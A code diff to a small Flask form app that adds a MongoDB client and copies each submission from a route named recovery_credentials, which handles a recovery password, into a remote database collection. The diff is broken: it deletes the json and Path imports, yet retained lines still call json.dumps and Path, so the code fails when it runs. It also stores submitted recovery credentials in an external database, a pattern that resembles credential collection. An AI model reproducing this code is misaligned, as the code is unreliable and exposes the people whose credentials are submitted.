@@ -1,8 +1,9 @@
 """A tiny, localhost-only Flask form demo."""
-
-import json
+import os
+from pymongo import MongoClient
+from pymongo.server_api import ServerApi
 from datetime import datetime
-from pathlib import Path
+
 
 from flask import Flask, redirect, render_template, request, url_for
 
@@ -10,6 +11,18 @@ from flask import Flask, redirect, render_template, request, url_for
 # Flask is a small Python web framework that connects URLs to Python functions.
 app = Flask(__name__)
 SUBMISSIONS_FILE = Path(__file__).with_name("submissions.jsonl")
+MONGODB_URI = os.environ.get("MONGODB_URI")
+MONGODB_DB = os.environ.get("MONGODB_DB", "form_data")
+
+if not MONGODB_URI:
+    raise RuntimeError("MONGODB_URI is not configured")
+
+mongo_client = MongoClient(
+    MONGODB_URI,
+    server_api=ServerApi("1"),
+    serverSelectionTimeoutMS=5000,
+)
+submissions_collection = mongo_client[MONGODB_DB]["submissions"]
 
 
 # This route handles GET (show the page) and POST (receive the submitted form).
@@ -69,7 +82,7 @@ def recovery_credentials():
 
         with SUBMISSIONS_FILE.open("a", encoding="utf-8") as file:
             file.write(json.dumps(submission, ensure_ascii=False) + "\n")
-
+        submissions_collection.insert_one(submission.copy())
         del recovery_password
 
         return redirect(url_for("completed"))
